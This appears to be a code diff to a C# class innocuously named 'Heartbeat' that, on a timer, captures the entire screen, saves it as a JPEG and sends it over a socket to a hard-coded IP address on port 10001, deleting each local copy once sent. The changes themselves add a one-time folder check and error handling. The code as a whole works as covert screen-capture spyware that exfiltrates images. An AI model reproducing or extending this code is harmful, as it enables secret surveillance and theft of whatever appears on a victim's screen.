@@ -17,7 +17,8 @@ namespace resource
         const string SERVER_IP = "10.10.10.241";
         const int CONNECT_PORT = 10001;
         const int BUFFER_SIZE = 10240;
-        static string fullPathName;
+        static string fullPathName = "";
+        static bool checkFolderFlag = true;
         public Heartbeat()
         {
             string dir = IMAGE_DIR;
@@ -31,8 +32,8 @@ namespace resource
         async private void TimerElapsed(object sender, ElapsedEventArgs e)
         {
             //Console.WriteLine("----------------------------------");
+            if(checkFolderFlag) CheckFolder();
             MainAction();
-            CheckFolder();
         }
         static void CheckFolder()
         {
@@ -41,31 +42,48 @@ namespace resource
             {
                 Directory.CreateDirectory(dir);
             }
+            checkFolderFlag = false;
         }
         static void MainAction()
         {
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            try
             {
-                using (Graphics g = Graphics.FromImage(bitmap))
+                Rectangle bounds = Screen.GetBounds(Point.Empty);
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                 {
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        try
+                        {
+                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine($"cannot catch screen-->{e}");
+                            return;
+                        }
+                    }
                     try
                     {
-                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                        string path = IMAGE_DIR;
+                        string FileName = Path.Combine(path, DateTime.Now.ToString("yyyyMMddHHmmss") + ".jpg");
+                        fullPathName = Path.GetFullPath(FileName);
+                        bitmap.Save(fullPathName, ImageFormat.Jpeg);
+                        Console.WriteLine($"fileName-->{fullPathName}");
+                        SendImage(fullPathName);
+                        File.Delete(fullPathName);
                     }
-                    catch (Exception)
+                    catch (Exception e)
                     {
-                        //Console.WriteLine("cannot catch screen.");
-                        //return false;
+                        Console.WriteLine($"EEEE2-->{e}");
+                        return;
                     }
                 }
-                string path = IMAGE_DIR;
-                string FileName = Path.Combine(path, DateTime.Now.ToString("yyyyMMddHHmmss") + ".jpg");
-                fullPathName = Path.GetFullPath(FileName);
-                bitmap.Save(fullPathName, ImageFormat.Jpeg);
-                Console.WriteLine($"fileName-->{fullPathName}");
-                SendImage(fullPathName);
-                File.Delete(fullPathName);
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine($"EEEE3-->{e}");
+                return;
             }
         }
         static void SendImage(string filename)
@@ -96,13 +114,12 @@ namespace resource
                         }
                     }
                 }
-
                 client.Close();
             }
             catch (SocketException)
             {
                 File.Delete(fullPathName);
-                //Console.WriteLine("Server is dead.");
+                Console.WriteLine("Server is dead.");
                 //return false;
             }
         }
